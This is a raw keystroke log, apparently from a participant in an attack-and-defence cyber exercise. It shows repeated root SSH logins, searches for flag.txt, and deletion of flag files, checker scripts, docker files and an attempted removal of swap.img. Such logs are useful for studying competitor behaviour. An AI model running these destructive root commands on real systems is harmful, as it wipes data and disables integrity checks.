2023-02-23 15:52:22-0500	<LShft>EZl<LShft>Yjlw<LShft>Mj<LShft>M=<Left><Left><Left><Left><Left><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>cybermayhem<LShft>_blueridge01<LShft>_12183.ovpn<BckSp><BckSp><BckSp><BckSp><BckSp>	cybermayhem_blueridge01_12183	cybermayhem_blueridge01_1218	0.38666666666666666		
2023-02-23 16:41:54-0500	<Enter>cd boo<BckSp><BckSp><BckSp>dev	cd dev	cd	0.5		
2023-02-23 16:42:00-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:42:01-0500	<Enter><Down><#+12>cd <BckSp><#+17>cle<BckSp><BckSp><BckSp>ssh root<LShft>@<LCtrl><LShft>V	<#+12>cd<#+17>ssh root@V	<#+12>cd<#+17>ssh	0.6666666666666666		
2023-02-23 16:42:33-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:42:35-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:42:40-0500	<Enter>ls\	ls\	ls	1.0		
2023-02-23 16:42:43-0500	<Enter><BckSp><LCtrl>zls	zls	zl	0.6		
2023-02-23 16:42:48-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:42:49-0500	<Enter>rm flag<Tab>	rm flag	rm	0.875		
2023-02-23 16:42:53-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:42:55-0500	<Enter>cat check.sh	cat check.sh	cat	1.0		
2023-02-23 16:42:57-0500	<Enter>ls<BckSp><BckSp>ssh root<LShft>@<LCtrl><LShft>V	ssh root@V	ssh	0.5882352941176471		
2023-02-23 16:43:26-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:43:28-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:43:34-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:43:36-0500	<Enter>rm fl<Tab>	rm fl	rm	0.8333333333333334		
2023-02-23 16:43:39-0500	<Enter>cd snape	cd snape	cd	1.0		
2023-02-23 16:43:44-0500	<Enter>cd snap	cd snap	cd	1.0		
2023-02-23 16:43:46-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:43:48-0500	<Enter>cd lxd	cd lxd	cd	1.0		
2023-02-23 16:43:51-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:43:52-0500	<Enter>ls 17<Tab>	ls 17	ls	0.8333333333333334		
2023-02-23 16:43:56-0500	<Enter>ls<BckSp><BckSp>cd <BckSp><BckSp><BckSp>cat current	cat current	cat	0.5238095238095238		
2023-02-23 16:44:02-0500	<Enter>cd cu<BckSp><#+16>root <LShft><#+3><BckSp><LShft><LShft>@s<BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>sssh <BckSp><BckSp><BckSp><BckSp>h<BckSp>sh root<LShft>@<LCtrl><LShft>V	cd c<#+16>rootssh root@V	cd	0.41379310344827586		
2023-02-23 16:44:26-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:44:31-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:44:34-0500	<Enter>cd<BckSp><BckSp><BckSp>cd<BckSp><BckSp><BckSp>,<BckSp>./check.cpp	./check.cpp	./check.cp	0.4782608695652174		
2023-02-23 16:44:47-0500	<Enter>clang<LShft>))<BckSp><BckSp><LShft>++ checker.cpp	clang++ checker.cpp	clang++	0.76		
2023-02-23 16:45:03-0500	<Enter>apt install clang	apt install clang	apt	1.0		
2023-02-23 16:45:07-0500	<Enter>y	y		1.0		
2023-02-23 16:45:09-0500	<Enter> <LCtrl>zvim cla<CpsLk>N<BckSp><BckSp><BckSp><BckSp>CHECK<BckSp><BckSp><BckSp><BckSp><BckSp><CpsLk>check<BckSp><BckSp><BckSp><BckSp><BckSp>checker.cpp	 zvim checker.cpp		0.3541666666666667		
2023-02-23 16:45:55-0500	<Enter><Down><#+20><Down><#+21><Down><#+11><Down><#+27><Up><#+19><Up><#+8><Up><Up><#+12><Up><#+24><Up><#+11><Up><#+19><Down><#+20><Down><#+5><Down><#+7><Down><#+49><LShft>:q<LShft>!	<#+20><#+21><#+11><#+27><#+19><#+8><#+12><#+24><#+11><#+19><#+20><#+5><#+7><#+49>:q!	<#+20><#+21><#+11><#+27><#+19><#+8><#+12><#+24><#+11><#+19><#+20><#+5><#+7><#+49>:q	0.8316831683168316		
2023-02-23 16:46:34-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:46:35-0500	<Enter>rm check<Tab>.cpp	rm check.cpp	rm	0.9230769230769231		
2023-02-23 16:46:55-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:46:56-0500	<Enter>rm check<Tab>	rm check	rm	0.8888888888888888		
2023-02-23 16:47:23-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:47:29-0500	<Enter>rm <BckSp><BckSp><BckSp><BckSp>rm fl<Tab>	rm fl	rm	0.38461538461538464		
2023-02-23 16:47:37-0500	<Enter>rm docker<Tab>	rm docker	rm	0.9		
2023-02-23 16:47:41-0500	<Enter>lds<BckSp><BckSp>s	ls	l	0.3333333333333333		
2023-02-23 16:47:56-0500	<Enter>cd snap	cd snap	cd	1.0		
2023-02-23 16:47:58-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:47:59-0500	<Enter>cd lex<BckSp><BckSp>xd	cd lxd	cd	0.6		
2023-02-23 16:48:02-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:48:03-0500	<Enter>ls<BckSp><BckSp>cd 176<Tab>	cd 176	cd	0.5454545454545454		
2023-02-23 16:48:08-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:48:09-0500	<Enter>ls -a	ls -a	ls	1.0		
2023-02-23 16:48:11-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:48:13-0500	<Enter>ls 198<Tab>	ls 198	ls	0.8571428571428571		
2023-02-23 16:48:16-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:48:16-0500	<Enter>ls common	ls common	ls	1.0		
2023-02-23 16:48:22-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:48:22-0500	<Enter>ls -a	ls -a	ls	1.0		
2023-02-23 16:48:24-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:48:26-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:48:28-0500	<Enter>cd lexd	cd lexd	cd	1.0		
2023-02-23 16:48:30-0500	<Enter>cd lxd	cd lxd	cd	1.0		
2023-02-23 16:48:33-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:48:34-0500	<Enter>ld<BckSp><BckSp>=cd <BckSp><BckSp><BckSp><BckSp>cd common	cd common	cd	0.42857142857142855		
2023-02-23 16:48:39-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:48:40-0500	<Enter>ls -a	ls -a	ls	1.0		
2023-02-23 16:48:42-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:48:44-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:48:45-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:48:46-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:48:47-0500	<Enter>clea<BckSp><BckSp><BckSp><BckSp><BckSp>ls	ls	l	0.18181818181818182		
2023-02-23 16:48:57-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:49:09-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:49:10-0500	<Enter>grep <LShft>*.<BckSp>./ <BckSp><BckSp><BckSp><BckSp>flag.txt	grep flag.txt	grep	0.5416666666666666		
2023-02-23 16:49:25-0500	<Enter>how to use grep to search for a file	how to use grep to search for a file	how	1.0		
2023-02-23 16:49:35-0500	<Enter>command to search for a file in directories	command to search for a file in directories	command	1.0		
2023-02-23 16:49:58-0500	<Enter><LCtrl>zfind flag<BckSp><BckSp><BckSp><BckSp>-exec flag.txt	zfind -exec flag.txt	zfind	0.6896551724137931		
2023-02-23 16:50:15-0500	<Enter>find .flag.txt	find .flag.txt	find	1.0		
2023-02-23 16:50:43-0500	<Enter>find /<LShft># find - name flag.txt	find /# find - name flag.txt	find	0.9655172413793104		
2023-02-23 16:51:39-0500	<Enter><Up><Left><Left><Left><Left><Left><Left><Left><Left><Left><Right><Left><Left><Left><Left><Left><Left><Right><BckSp>			0.0		
2023-02-23 16:51:46-0500	<Enter>ssh root<LShft>@<LCtrl><LShft>V<BckSp><#+11><BckSp><BckSp><BckSp><LCtrl><LShft>V	ssh root@<#+V	ssh	0.5		
2023-02-23 16:52:15-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:52:17-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:52:23-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:52:26-0500	<Enter>rm <BckSp><BckSp><BckSp><BckSp>find -name flag.txt	find -name flag.txt	find	0.7307692307692307		
2023-02-23 16:52:37-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:52:39-0500	<Enter><BckSp>cd ..	cd ..	cd	0.8333333333333334		
2023-02-23 16:53:24-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:53:25-0500	<Enter>s<BckSp>cat swamp.<BckSp><BckSp><BckSp><BckSp>ap.img	cat swap.img	cat	0.5454545454545454		
2023-02-23 16:53:34-0500	<Enter><LCtrl>z	z		0.5		
2023-02-23 16:53:39-0500	<Enter>rm swap.img	rm swap.img	rm	1.0		
2023-02-23 16:53:42-0500	<Enter>ye<BckSp><BckSp><BckSp>sudo rm swap.img	sudo rm swap.img	sudo	0.7619047619047619		
2023-02-23 16:53:48-0500	<Enter>chmod <BckSp><#+16>exiftool swap.img	chmod<#+16>exiftool swap.img	chmod<#+16>exiftool	0.9333333333333333		
2023-02-23 16:54:22-0500	<Enter>how to f<BckSp>check file details us<BckSp><BckSp><BckSp>	how to check file details	how	0.7575757575757576		
2023-02-23 16:54:32-0500	<Enter> in linux	 in linux		1.0		
2023-02-23 16:54:36-0500	<Enter><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp><BckSp>metedata	metedata	metedat	0.47058823529411764		
2023-02-23 16:54:59-0500	<Enter>find -name flag.txt	find -name flag.txt	find	1.0		
2023-02-23 16:55:20-0500	<Enter>l<BckSp>rm ./opt/flag.txt	rm ./opt/flag.txt	rm	0.8947368421052632		
2023-02-23 16:55:35-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:55:47-0500	<Enter>ssh root<LShft>@<LCtrl><LShft>V	ssh root@V	ssh	0.7692307692307693		
2023-02-23 16:56:01-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:56:08-0500	<Enter>;s<BckSp><BckSp>ls	ls	l	0.3333333333333333		
2023-02-23 16:56:11-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:56:13-0500	<Enter>;s	;s	;	1.0		
2023-02-23 16:56:14-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:56:15-0500	<Enter>find -name flag.txt	find -name flag.txt	find	1.0		
2023-02-23 16:56:26-0500	<Enter>ss<BckSp><BckSp><BckSp>rm  ./<BckSp><BckSp><BckSp><BckSp> ./opt/fl;a<BckSp><BckSp>ag.txt	rm ./opt/flag.txt	rm	0.5		
2023-02-23 16:56:40-0500	<Enter><Up>			0.0		
2023-02-23 16:56:44-0500	<Enter><Up><Left><Left><Left><Right><Right><LShft>"<Left><Right><BckSp><Right><LShft>"<Left><#+17><Left><Right><LShft>"<BckSp><Right><LShft>"	<#+17>""	<#+17>"	0.27586206896551724		
2023-02-23 16:57:04-0500	<Enter>ssh root<LShft>@<LCtrl><LShft>VC<BckSp><#+12><BckSp><LCtrl><LShft>V	ssh root@V<#+12V	ssh	0.64		
2023-02-23 16:57:51-0500	<Enter>yes	yes	ye	1.0		
2023-02-23 16:57:53-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:57:58-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:58:04-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:58:05-0500	<Enter>find -name flag.txt	find -name flag.txt	find	1.0		
2023-02-23 16:58:14-0500	<Enter>cd ./opt/f<BckSp><#+1><BckSp><BckSp><BckSp><BckSp>root/flag.txt	cd ./opt/<root/flag.txt	cd	0.696969696969697		
2023-02-23 16:58:33-0500	<Enter>cat<BckSp><BckSp><BckSp>cd ./rppt<BckSp><BckSp><BckSp>oot	cd ./root	cd	0.42857142857142855		
2023-02-23 16:58:42-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:58:43-0500	<Enter>rm flag.txt	rm flag.txt	rm	1.0		
2023-02-23 16:58:46-0500	<Enter>ssh root<LShft>@<LCtrl><LShft>V	ssh root@V	ssh	0.7692307692307693		
2023-02-23 16:58:58-0500	<Enter>ye<BckSp><BckSp><LCtrl><LShft>V	V		0.14285714285714285		
2023-02-23 16:59:04-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:59:07-0500	<Enter>find -name flag.txt	find -name flag.txt	find	1.0		
2023-02-23 16:59:13-0500	<Enter>cd ./opt	cd ./opt	cd	1.0		
2023-02-23 16:59:19-0500	<Enter>ls	ls	l	1.0		
2023-02-23 16:59:20-0500	<Enter>fm<BckSp><BckSp>rm flag.txt	rm flag.txt	rm	0.7333333333333333		
2023-02-23 16:59:24-0500	<Enter>ssh root<LShft>@<LCtrl><LShft>V	ssh root@V	ssh	0.7692307692307693		
2023-02-23 16:59:31-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 16:59:38-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 16:59:43-0500	<Enter>find -name flag.txt	find -name flag.txt	find	1.0		
2023-02-23 16:59:48-0500	<Enter>cd ./opt	cd ./opt	cd	1.0		
2023-02-23 16:59:51-0500	<Enter>rm flag.txt	rm flag.txt	rm	1.0		
2023-02-23 16:59:55-0500	<Enter>ssh root<LShft>@<LCtrl><LShft>V	ssh root@V	ssh	0.7692307692307693		
2023-02-23 17:00:04-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 17:00:12-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 17:00:15-0500	<Enter>find -name flag.txt	find -name flag.txt	find	1.0		
2023-02-23 17:00:20-0500	<Enter>cd ./opt	cd ./opt	cd	1.0		
2023-02-23 17:00:24-0500	<Enter>rm flag.txt	rm flag.txt	rm	1.0		
2023-02-23 17:00:28-0500	<Enter>ls	ls	l	1.0		
2023-02-23 17:00:33-0500	<Enter>ssh root<LShft>@<LCtrl><LShft>V	ssh root@V	ssh	0.7692307692307693		
2023-02-23 17:01:01-0500	<Enter><LCtrl><LShft>V	V		0.3333333333333333		
2023-02-23 17:01:07-0500	<Enter>cd ..	cd ..	cd	1.0		
2023-02-23 17:01:09-0500	<Enter><LCtrl>c	c		0.5		
2023-02-23 17:01:45-0500	c<LMeta><Left>	c		0.5		
